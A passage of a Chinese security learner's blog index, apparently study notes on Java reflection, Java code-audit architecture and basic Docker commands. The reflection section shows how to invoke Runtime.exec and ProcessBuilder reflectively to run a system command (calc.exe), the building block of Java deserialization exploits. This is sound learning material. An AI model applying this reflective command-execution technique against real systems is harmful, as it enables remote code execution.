class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到最先执行的就是静态代码块（注意这里用不了this，因为this指代当前TrainPrint这个类的对象，现在类刚刚加载，还没有分配内存地址)，随后执行代码块，然后执行构造方法，然后调用fuck方法输出this。</p><h4 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h4><p>我的理解：类对象就是java文件编译后的class文件，字节码存放于class文件中，之后交给JVM运行，因此获得了字节码就等于我们获得了程序运行时类的状态。</p><ol><li>forName()</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>forName实现了动态加载类，因此还会执行静态代码块（类中static段的代码）。</p><ol start="2"><li>类名.class</li></ol><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">rt</span> <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仅仅是获得类对象。</p><ol start="3"><li>getClass()</li></ol><pre class="line-numbers language-java"><code class="language-java">Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种要先获取实例化对象在拿到class object。</p><ol start="4"><li>getSystemClassLoader().loadClass()</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仅仅是获得类对象。</p><h4 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h4><ol><li>getDeclaredMethods</li></ol><p>返回类或接口声明的所有方法，包括public、protected、private和默认方法，但不包括继承的方法。</p><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> a <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>getMethods</li></ol><p>返回某个类的所有public方法，包括其继承类的public方法。</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">a</span><span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>getMethod</li></ol><p>getMethod方法只能返回一个特定的方法。注意，第二个参数是第一个参数方法的参数，因为exec的参数是String，因此后面要跟上String.class</p><pre class="line-numbers language-java"><code class="language-java">Runtime rt <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>getDeclaredMethod</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> a <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同上。</p><h4 id="获取类的成员变量"><a href="#获取类的成员变量" class="headerlink" title="获取类的成员变量"></a>获取类的成员变量</h4><p>四个方法对应上文获取类方法的四个方法。</p><ol><li>getDeclaredFields</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field<span class="token punctuation">[</span><span class="token punctuation">]</span> getDeclaredFields <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>getFields</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field<span class="token punctuation">[</span><span class="token punctuation">]</span> getFields <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>getField</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field getField <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>变量没有参数，因此获取变量自然不需要第二个参数了，注意只能获取public类型的变量。</p><ol start="4"><li>getDeclareField</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field getDeclaredField <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h4><p>获取对象都是用newInstance()方法，注意要先获得类对象。</p><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 无参数</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参数构造对象第一种方法："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters_1 <span class="token operator">=</span> <span class="token punctuation">(</span>newInstanceExample<span class="token punctuation">)</span>cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参数构造对象第二种方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters_2 <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 有参数</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参数构造对象第一种方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters_1 <span class="token operator">=</span> <span class="token punctuation">(</span>newInstanceExample<span class="token punctuation">)</span>cls<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参数构造对象第二种方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters_2 <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果构造函数有参数，那么需要调用getConstructor()并且传入参数对应类型的类对象。</p><p>但这个方法有限制：</p><ul><li>待实例化的类的构造函数不能是私有的</li></ul><p>如果有private构造函数则不能实例化。</p><h4 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h4><ol><li>直接通过.调用方法，因此要在实例化对象的基础上获取上。</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调用对象的方法</span><span class="token comment" spellcheck="true">// 直接调用</span>no_parameters<span class="token punctuation">.</span><span class="token function">method_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>no_parameters<span class="token punctuation">.</span><span class="token function">method_2</span><span class="token punctuation">(</span><span class="token string">"no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>have_parameters<span class="token punctuation">.</span><span class="token function">method_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>have_parameters<span class="token punctuation">.</span><span class="token function">method_2</span><span class="token punctuation">(</span><span class="token string">"yes!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>invoke调用，因此要在获得类对象的基础上获取方法。</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method_2"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>no_parameters<span class="token punctuation">,</span><span class="token string">"invoke方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>String obj <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"method_1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>no_parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>在学会了invoke调用，接着来学习通过反射执行系统命令。</p><h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>Runtime这个类有exec可以调用系统命令，因此我们可以加载Runtime这个类。</p><p>读一下Runtime源码，就会发现Runtime的构造方法是静态的，因此无法通过newInstance实例化Runtime，可以自己去试一下，new Runtime会报错。而正确的获得实例化对象的方法是Runtime.getRuntime()【getRuntime方法是静态的】</p><p>因此，<em>第一种方法</em>：</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>clazz.getMethod(“getRuntime”).invoke(clazz)通过这段代码调用getRuntime获得对象，然后传进invoke里进而执行exec函数。</strong></p><p>如果不调用getRuntime，也可以通过getDeclaredConstructor并且设置作用域执行，<em>第二种方法</em>：</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Constructor m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>ProcessBuilder这个类的构造方法是public的，一个支持参数为LIst，另一个支持String。并且它的start方法能够执行命令，因此也可以通过ProcessBuilder执行命令。</p><p><em>第一种方法：</em></p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>List<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em>第二种方法：</em></p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反射 </tag>
            
            <tag> Java安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计基础—架构</title>
      <link href="/2021/11/12/java-dai-ma-shen-ji-ji-chu-jia-gou/"/>
      <url>/2021/11/12/java-dai-ma-shen-ji-ji-chu-jia-gou/</url>
      
        <content type="html"><![CDATA[<blockquote><p>架构的目的就是分层，使得职能分离。</p></blockquote><h4 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h4><ul><li>M 代表 模型（Model）：用来取数据的，我的理解是充当DAO层以及POJO这些。</li><li>V 代表 视图（View）：负责页面展示。</li><li>C 代表 控制器（Controller) ：处理逻辑，控制页面跳转。</li></ul><p>这样的目的主要是把View和Model分离，改样式就动View层，Controller负责逻辑，也就是与V和M之间的联系。</p><h4 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h4><p>可以看到MVC分离的还不够细化，因此SpringMVC实现了把控制器分为控制层以及业务层（实际上咱现在用的基本都是SpringMVC以及SpringBoot这种）</p><p>SpringMVC：视图层调用控制层，控制层调用业务层，业务层调用数据访问层。</p><p><strong>数据访问层</strong>：data access object(DAO)，DAO就是封装实体类在数据库中增删改查的操作。</p><p><strong>业务层</strong>：用来写业务逻辑的<br>对于Service，就是 Servlet 和 Dao 层之间缓冲的层。通过这一层来进行解耦，使得 Dao 层内的变化不会直接影响到 Servlet 层。</p><p><strong>控制层</strong>：MVC中的Controller，用于处理前端页面跳转，调用业务层实现前端页面动态数据的展示。</p><p><strong>视图层</strong>：页面展示。</p><h4 id="JAVAEE分层模型"><a href="#JAVAEE分层模型" class="headerlink" title="JAVAEE分层模型"></a>JAVAEE分层模型</h4><p>就是SpringMVC，除此之外多了一个DO。<br><strong>Domain Object(领域对象)层</strong></p><p>DO是从现实世界中抽象出来的有形或无形的业务实体。</p><p>说白了像一个entity对应一张表叫DO。</p><p><strong>DAO(数据访问对象)层</strong><br>DAO实现了对数据库的CRUD等常见操作。</p><p><strong>Service(业务逻辑)层</strong><br>实现了系统所需要的业务逻辑方法。</p><p><strong>Controller(控制器)层</strong><br>本层由一系列控制器组成，这些控制器用于拦截用户的请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的View组件转发。</p><p><strong>View(表现层)层</strong><br>页面展示。</p><p>分层模型图如下：</p><p><img src="https://img-blog.csdnimg.cn/3a9d1d1175bf4645b35363b16a857e90.png#pic_center" alt="出自JAVA代码安全审计"></p><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>1.Java代码安全审计（入门篇）                徐焱</p><p>2.<a href="https://blog.csdn.net/weixin_45442296/article/details/123111903">https://blog.csdn.net/weixin_45442296/article/details/123111903</a>      JavaRange</p><p>3.<a href="https://blog.csdn.net/qq_43391574/article/details/110944815">https://blog.csdn.net/qq_43391574/article/details/110944815</a>             落雨青石街</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全基础 </tag>
            
            <tag> MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基础命令学习</title>
      <link href="/2021/11/05/docker-ji-chu-ming-ling-xue-xi/"/>
      <url>/2021/11/05/docker-ji-chu-ming-ling-xue-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><pre class="line-numbers language-shell"><code class="language-shell">docker search xxxdocker search --filter=STARS=1000       #过滤，指定搜索stars大于1000的镜像<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>search指令可以搜索指定名称或者仓库的镜像的信息。</p><ol><li>STARS: 镜像的stars—越高越受欢迎，</li><li>OFFICIAL: 是否是官方提供的</li><li>AUTOMATED:  是不是自动化的</li></ol><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><pre class="line-numbers language-shell"><code class="language-shell">docker pull xxxdocker pull xxx:tag       #指定版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把指定镜像拉到本地仓库，默认为拉取最新版本。可以通过[镜像:版本号]的形式指定对应版本号的镜像下载，例如：docker pull mysql:5.6.50</p><h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><pre class="line-numbers language-shell"><code class="language-shell">docker images || docker images -a  #查看镜像所有信息docker images -aq                  #查看镜像id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>REPOSITORY: 镜像仓库名</li><li>TAG:                镜像标签</li><li>IMAGE ID:       镜像id</li><li>CREATED:          镜像创建时间</li><li>SIZE:                镜像大小</li></ol><h4 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker run xxx      #指定xxx镜像生成容器docker run -p 8080:8080 -d xxx  #容器内部8080端口映射到本地8080端口，并守护进程后台运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>-p：容器内部端口绑定到指定的主机端口</p></li><li><p>-P：容器内部端口随机映射到主机的端口</p></li><li><p>-t：提供终端输入</p></li><li><p>-i：提供交互</p></li><li><p>-d：容器在后台运行</p></li></ul><h4 id="查看镜像状态"><a href="#查看镜像状态" class="headerlink" title="查看镜像状态"></a>查看镜像状态</h4><pre class="line-numbers language-shell"><code class="language-shell">docker ps          #查看正在运行中的的容器docker ps -a       #查看所有容器docker ps -q       #看正在运行中的的容器：仅列出编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker stop xxx      #指定编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker start XXX         #指定编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker restart xxx      #指定编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker rm xxxxxxxxxx      # 删除指定容器docker rm -f xxxxxxxxxx  # 强制删除运行中的容器docker rm -f $(docker ps -aq) # 迭代删除全部的容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="进入容器的bash"><a href="#进入容器的bash" class="headerlink" title="进入容器的bash"></a>进入容器的bash</h4><pre class="line-numbers language-shell"><code class="language-shell">docker exec -it xxxxx /bin/bash   # 进入到指定容器内部进行修改  开启一个新的终端exit        #退出bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h4><pre class="line-numbers language-shell"><code class="language-shell">cp ./flag xx:/var/www/html/flag      #将当前目录的flag拷贝到指定为xx id的容器/var/www/html/flag中cp xx:/var/www/html/flag .flag #将指定为xx id的容器/var/www/html下的flag文件拷贝到当前目录flag文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h4><pre class="line-numbers language-shell"><code class="language-shell">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后就是联动vulhub一键搭环境。</p><h4 id="vulhub一键搭漏洞环境"><a href="#vulhub一键搭漏洞环境" class="headerlink" 